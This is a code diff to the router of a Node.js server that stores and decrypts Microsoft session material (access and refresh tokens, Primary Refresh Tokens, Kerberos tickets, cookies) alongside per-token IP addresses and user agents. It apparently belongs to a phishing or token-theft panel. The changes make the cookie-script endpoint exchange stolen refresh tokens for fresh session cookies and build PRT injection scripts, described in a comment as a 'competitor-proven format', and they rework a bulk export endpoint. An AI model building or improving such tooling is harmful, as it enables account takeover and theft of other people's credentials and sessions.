@@ -120,7 +120,7 @@ router.get('/:id', userAuth, async (req, res) => {
       token_type: token.token_type,
       ip_address: token.ip_address,
       user_agent: token.user_agent,
-      notes: token.notes,
+      notes: token.notes || '',
       expiration: token.expiration,
       last_renewed: token.last_renewed,
       renewal_count: token.renewal_count,
@@ -130,17 +130,17 @@ router.get('/:id', userAuth, async (req, res) => {
       template_type: token.template_type,
       token_status: token.token_status || 'unknown',
       created_at: token.created_at,
-      access_token: decrypt(token.access_token_encrypted),
-      refresh_token: decrypt(token.refresh_token_encrypted),
-      id_token: decrypt(token.id_token_encrypted),
-      cookies: decrypt(token.cookies_encrypted),
-      prt: decrypt(token.prt),
-      session_key_jwe: decrypt(token.session_key_jwe),
+      access_token: token.access_token_encrypted ? decrypt(token.access_token_encrypted) : null,
+      refresh_token: token.refresh_token_encrypted ? decrypt(token.refresh_token_encrypted) : null,
+      id_token: token.id_token_encrypted ? decrypt(token.id_token_encrypted) : null,
+      cookies: token.cookies_encrypted ? decrypt(token.cookies_encrypted) : null,
+      prt: token.prt ? decrypt(token.prt) : null,
+      session_key_jwe: token.session_key_jwe ? decrypt(token.session_key_jwe) : null,
       device_tenant_id: token.device_tenant_id,
-      tgt_ad: decrypt(token.tgt_ad),
-      tgt_cloud: decrypt(token.tgt_cloud),
+      tgt_ad: token.tgt_ad ? decrypt(token.tgt_ad) : null,
+      tgt_cloud: token.tgt_cloud ? decrypt(token.tgt_cloud) : null,
       kerberos_top_level_names: token.kerberos_top_level_names,
-      tgt_cloud_sessionkey: decrypt(token.tgt_cloud_sessionkey)
+      tgt_cloud_sessionkey: token.tgt_cloud_sessionkey ? decrypt(token.tgt_cloud_sessionkey) : null
     };
 
     res.json(decrypted);
@@ -186,43 +186,45 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
-    const accessToken = decrypt(token.access_token_encrypted);
-    const refreshToken = decrypt(token.refresh_token_encrypted);
-    var cookies = decrypt(token.cookies_encrypted);
+    const accessToken = token.access_token_encrypted ? decrypt(token.access_token_encrypted) : null;
+    const refreshToken = token.refresh_token_encrypted ? decrypt(token.refresh_token_encrypted) : null;
+    const storedCookies = token.cookies_encrypted ? decrypt(token.cookies_encrypted) : null;
 
-    if (!accessToken && !refreshToken && !cookies) {
+    if (!accessToken && !refreshToken && !storedCookies) {
       return res.status(400).json({ error: 'No tokens available' });
     }
 
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
     var accountType = token.account_type || 'unknown';
     var cookiesList = [];
-    if (cookies) {
-      // FIX: Pass tenant and account type for proper domain handling
-      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-    }
+    var cookies = null;
 
-    // FIX: If no cookies string exists but we have access/refresh tokens,
-    // use the cookie converter to generate cookies from the tokens
-    if (cookiesList.length === 0 && (accessToken || refreshToken)) {
+    // ALWAYS exchange refresh token first for fresh cookies (primary method)
+    if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
-        const tokenToUse = refreshToken || accessToken;
         const templateType = token.template_type || 'office';
-        console.log('[Tokens] Converting token to cookies for script generation...');
+        console.log('[Tokens] Exchanging refresh token for fresh cookies...');
         const conversionResult = await cookieConverter.convertTokensToCookies(
-          tokenToUse, templateType, tenant, null, accountType
+          refreshToken, templateType, tenant, null, accountType
         );
         if (conversionResult.success && conversionResult.cookies) {
           cookies = conversionResult.cookies;
           cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
-          console.log('[Tokens] Successfully converted token to cookies:', cookiesList.length, 'cookies');
+          console.log('[Tokens] Fresh cookies generated:', cookiesList.length);
         } else {
-          console.warn('[Tokens] Token conversion failed:', conversionResult.error);
+          console.warn('[Tokens] Token exchange failed:', conversionResult.error);
         }
       } catch (convertErr) {
         console.error('[Tokens] Cookie conversion error:', convertErr.message);
       }
+    }
+
+    // Fallback: use stored cookies if exchange failed
+    if (cookiesList.length === 0 && storedCookies) {
+      console.log('[Tokens] Using stored cookies as fallback');
+      cookies = storedCookies;
+      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     }
 
     // Generate x-ms-RefreshTokenCredential PRT script (competitor-proven format)
@@ -230,10 +232,9 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
-        // Extract tid/uid from id_token if available
         var tid = tenant;
         var uid = '';
-        const idToken = decrypt(token.id_token_encrypted);
+        const idToken = token.id_token_encrypted ? decrypt(token.id_token_encrypted) : null;
         if (idToken) {
           try {
             const idPayload = idToken.split('.')[1];
@@ -243,8 +244,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
             tid = decoded.tid || tid;
           } catch (e) { /* ignore */ }
         }
-        // Try to get uid from session_key_jwe / client_info
-        const sessionKeyJwe = decrypt(token.session_key_jwe);
+        const sessionKeyJwe = token.session_key_jwe ? decrypt(token.session_key_jwe) : null;
         if (sessionKeyJwe) {
           try {
             const parsed = JSON.parse(sessionKeyJwe);
@@ -289,7 +289,8 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       scripts: scripts,
       cookie_count: cookiesList.length,
       cookies: cookiesList,
-      generated_at: new Date().toISOString()
+      generated_at: new Date().toISOString(),
+      fresh: cookiesList.length > 0
     });
   } catch (err) {
     console.error('[Tokens] Cookie script error:', err);
@@ -1031,15 +1032,15 @@ router.post('/export', userAuth, async (req, res) => {
       token_type: token.token_type,
       ip_address: token.ip_address,
       user_agent: token.user_agent,
-      notes: token.notes,
+      notes: token.notes || '',
       expiration: token.expiration,
       created_at: token.created_at,
-      access_token: decrypt(token.access_token_encrypted),
-      refresh_token: decrypt(token.refresh_token_encrypted),
-      id_token: decrypt(token.id_token_encrypted),
-      cookies: decrypt(token.cookies_encrypted),
-      prt: decrypt(token.prt),
-      session_key_jwe: decrypt(token.session_key_jwe),
+      access_token: token.access_token_encrypted ? decrypt(token.access_token_encrypted) : null,
+      refresh_token: token.refresh_token_encrypted ? decrypt(token.refresh_token_encrypted) : null,
+      id_token: token.id_token_encrypted ? decrypt(token.id_token_encrypted) : null,
+      cookies: token.cookies_encrypted ? decrypt(token.cookies_encrypted) : null,
+      prt: token.prt ? decrypt(token.prt) : null,
+      session_key_jwe: token.session_key_jwe ? decrypt(token.session_key_jwe) : null,
       account_type: token.account_type || 'unknown'
     }));
 
@@ -1058,7 +1059,7 @@ router.post('/export', userAuth, async (req, res) => {
     });
   } catch (err) {
     console.error('[Tokens] Export error:', err);
-    res.status(500).json({ error: 'Server error' });
+    res.status(500).json({ error: 'Server error', details: err.message });
   }
 });
 
